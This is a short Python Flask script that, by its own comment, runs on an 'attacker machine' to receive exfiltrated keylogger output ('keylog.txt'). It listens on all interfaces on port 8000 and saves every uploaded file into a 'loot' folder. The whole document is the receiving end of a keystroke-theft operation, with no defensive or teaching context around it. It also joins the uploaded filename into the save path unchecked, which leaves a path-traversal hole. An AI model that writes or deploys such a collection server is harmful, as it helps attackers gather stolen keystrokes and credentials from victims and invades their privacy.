from flask import Flask, request
import os

# run this code on attacker machine to listen for keylog.txt

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_file():
    if 'file' not in request.files:
        return 'No file part', 400
    file = request.files['file']
    filename = file.filename
    save_path = os.path.join("loot", filename)
    file.save(save_path)
    return 'File received', 200

if __name__ == '__main__':
    os.makedirs("loot", exist_ok=True)
    app.run(host='0.0.0.0', port=8000)